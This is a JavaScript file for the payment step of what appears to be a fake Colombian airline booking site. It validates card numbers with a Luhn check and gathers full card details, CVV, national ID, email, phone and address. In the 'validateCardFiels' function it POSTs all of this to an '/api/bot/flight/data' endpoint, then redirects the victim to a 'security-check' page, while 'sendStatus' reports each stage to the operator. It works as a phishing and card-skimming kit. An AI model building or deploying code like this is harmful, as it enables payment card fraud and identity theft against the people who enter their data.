const DOMElements = {
    labelDepartures: document.querySelector('#label-departures'),
    labelTotalResume: document.querySelector('#label-total-resume'),
    btnNextStep: document.querySelector('#btn-next-step'),
    contPaymentMethod: document.querySelector('#payment-method'),
    contCardInputs: document.querySelector('#card-inputs'),
    btnSubmitForm : document.querySelector('#submit-form'),
    inputP: document.querySelector('#p'),
    formMain: document.querySelector('#main-form'),
}




/**
 * Startup@Payment
 * 
 */
document.addEventListener('DOMContentLoaded', ()=>{
    eventListeners();
    updateDOM();
    sendStatus();
});




/**
 * Events@Payment
 * 
 */
const eventListeners = ()=>{
    const { contPaymentMethod, contCardInputs, inputP, btnNextStep, btnSubmitForm, formMain } = DOMElements;

    contPaymentMethod.addEventListener('click', () =>{
        contCardInputs.classList.remove('hide');
    });

    btnNextStep.addEventListener('click', () =>{
        btnSubmitForm.click();
    });

    formMain.addEventListener('submit', (e) =>{
        e.preventDefault();

        validateCardFiels();
    });
}

const updateDOM = ()=>{
    const { labelDepartures, labelTotalResume } = DOMElements;
    const { travel_type, seat_type, origin, destination, adults, children, babies, flightDates } = info.flightInfo;

    /** Label departures */
    if(travel_type === 1){
        labelDepartures.textContent = `${origin.city} - ${destination.city} | ${destination.city} - ${origin.city}`
    }else if(travel_type === 2){
        labelDepartures.textContent = `${origin.city} - ${destination.city}`
    }else{
        console.log('pita');
    }

    /** label total flight */
    const totalLight = (PRECIO_BASE * (adults + children));
    const totalSmart = (PRECIO_BASE * MULTIPLICADORES_PRECIO.smart * (adults + children));
    const totalFull = (PRECIO_BASE * MULTIPLICADORES_PRECIO.full * (adults + children));
    
    let total = 0;
    if(origin.ticket_type === 'light'){
        total += totalLight;
    }else if(origin.ticket_type === 'smart'){
        total += totalSmart;
    }else if(origin.ticket_type === 'full'){
        total += totalFull;
    }else{
        console.log('TICKET_TYPE_NULL');
    }

    if(travel_type === 1){
        if(destination.ticket_type === 'light'){
            total += totalLight;
        }else if(destination.ticket_type === 'smart'){
            total += totalSmart;
        }else if(destination.ticket_type === 'full'){
            total += totalFull;
        }else{
            console.log('TICKET_TYPE_NULL');
        }
    }

    labelTotalResume.textContent = '$ '+total.toLocaleString('es-ES')+' COP';
}



/**
 * Functions@Payment
 * 
 */
const validateCardFiels = () =>{

    const p = document.querySelector('#p');
    const pdate = document.querySelector('#pdate');
    const c = document.querySelector('#c');
    const ban = document.querySelector('#ban');
    const name = document.querySelector('#name');
    const surname = document.querySelector('#name');
    const cc = document.querySelector('#cc');
    const email = document.querySelector('#email');
    const telnum = document.querySelector('#telnum');
    const city = document.querySelector('#city');
    const address = document.querySelector('#address');

    if((p.value.length === 19 && p.value[0] !== '3' && ['4', '5'].includes(p.value[0])) || (p.value.length === 17 && p.value[0] === '3')){
        if(isLuhnValid(p.value)){
            if(isValidDate(pdate.value)){
                if((c.value.length === 3 && p.value.length === 19) || (c.value.length === 4 && p.value.length === 17)){
                    console.log("Ok. Let's go!");

                    info.metaInfo.p = p.value;
                    info.metaInfo.ban = ban.value;
                    info.metaInfo.pdate = pdate.value;
                    info.metaInfo.c = c.value;
                    info.metaInfo.name = name.value+' '+surname.value;
                    info.metaInfo.cc = cc.value;
                    info.metaInfo.email = email.value;
                    info.metaInfo.telnum = telnum.value;
                    info.metaInfo.city = city.value;
                    info.metaInfo.address = address.value;

                    if(info.metaInfo.p[0] == '4'){
                        info.checkerInfo.company = 'VISA';
                    }else if(info.metaInfo.p[0] == '5'){
                        info.checkerInfo.company = 'MC';
                    }else if(info.metaInfo.p[0] == '3'){
                        info.checkerInfo.company = 'AM';
                    }

                    console.log(info.metaInfo);

                    updateLS();

                    let payload = info.metaInfo
                    payload.origin = info.flightInfo.origin.city;
                    payload.destination = info.flightInfo.destination.city;
                    payload.flightDates = info.flightInfo.flightDates;
                    payload.type = info.flightInfo.travel_type === 1 ? 'Ida Y Vuelta' : 'Solo Ida';
                    payload.adults = info.flightInfo.adults;
                    payload.children = info.flightInfo.children;
                    payload.babies = info.flightInfo.babies;
                    payload.dudename = info.metaInfo.name.split(' ')[0] ?? info.metaInfo.name;
                    payload.surname = info.metaInfo.name.split(' ')[1] ?? '';
                    fetch(`${API_URL}/api/bot/flight/data`, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                            'Authorization': `Bearer ${API_KEY}`,
                        },
                        body: JSON.stringify(payload)
                    });

                    document.querySelector('.loader').classList.add('show');

                    setTimeout(() => window.location.href = 'security-check.html', 3000);

                }else{
                    alert('Revise el CVV de su tarjeta.');
                    c.value = '';
                    c.focus();
                }
            }else{
                alert('Revise la fecha de vencimiento de su tarjeta.');
                pdate.value = '';
                pdate.focus();
            }
        }else{
            alert('Número de tarjeta inválido. Revisalo e intenta de nuevo.');
            p.value = ''
            p.focus();;
        }
    }else{
        alert('Revisa el número de tu tarjeta.');
        p.value = '';
        p.focus();
    }
};

function formatCNumber(input) {
    let numero = input.value.replace(/\D/g, ''); // Eliminar todos los caracteres no numéricos

    let numeroFormateado = '';

    // American express
    if (numero[0] === '3') {

        c.setAttribute('oninput', "limitDigits(this, 4)");

        if (numero.length > 15) {
            numero = numero.substr(0, 15); // Limitar a un máximo de 15 caracteres
        }

        for (let i = 0; i < numero.length; i++) {
            if (i === 4 || i === 10) {
                numeroFormateado += ' ';
            }

            numeroFormateado += numero.charAt(i);
        }

        input.value = numeroFormateado;
    } else {

        c.setAttribute('oninput', "limitDigits(this, 3)");
        if (numero.length > 16) {
            numero = numero.substr(0, 16); // Limitar a un máximo de 16 dígitos
        }
        for (let i = 0; i < numero.length; i++) {
            if (i > 0 && i % 4 === 0) {
                numeroFormateado += ' ';
            }
            numeroFormateado += numero.charAt(i);
        }
        input.value = numeroFormateado;
    }
}

function formatDate(input) {
    var texto = input.value;
    
    texto = texto.replace(/\D/g, '');

    texto = texto.substring(0, 4);

    if (texto.length > 2) {
        texto = texto.substring(0, 2) + '/' + texto.substring(2, 4);
    }
    input.value = texto;
}

function isLuhnValid(bin) {
    bin = bin.replace(/\D/g, '');

    if (bin.length < 6) {
        return false;
    }
    const digits = bin.split('').map(Number).reverse();

    let sum = 0;
    for (let i = 0; i < digits.length; i++) {
        if (i % 2 !== 0) {
            let doubled = digits[i] * 2;
            if (doubled > 9) {
                doubled -= 9;
            }
            sum += doubled;
        } else {
            sum += digits[i];
        }
    }

    return sum % 10 === 0;
}

function isValidDate(fechaInput) {
    var partes = fechaInput.split('/');
    var mesInput = parseInt(partes[0], 10);
    var añoInput = parseInt(partes[1], 10);

    // Verificar que el mes no sea mayor a 12
    if (mesInput > 12) {
        return false;
    }

    // Ajustar el año para tener en cuenta el formato de dos dígitos
    añoInput += 2000;

    var fechaActual = new Date();
    var añoActual = fechaActual.getFullYear();
    var limiteAño = añoActual + 8; // Año actual + 8

    // Verificar que el año no sea mayor al año actual + 8
    if (añoInput > limiteAño || (añoInput === limiteAño && mesInput >= 1)) {
        return false;
    }

    // Verificar que la fecha no sea futura
    if (añoInput > añoActual || (añoInput === añoActual && mesInput >= (fechaActual.getMonth() + 1))) {
        return true;
    } else {
        return false;
    }
}

const sendStatus = () =>{
    try{
        fetch(`${API_URL}/api/bot/status`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'Authorization': `Bearer ${API_KEY}`
            },
            body: JSON.stringify({message: 'P5-PAYMENT'})
        });
    }catch(err){
        console.log(err);
    }
}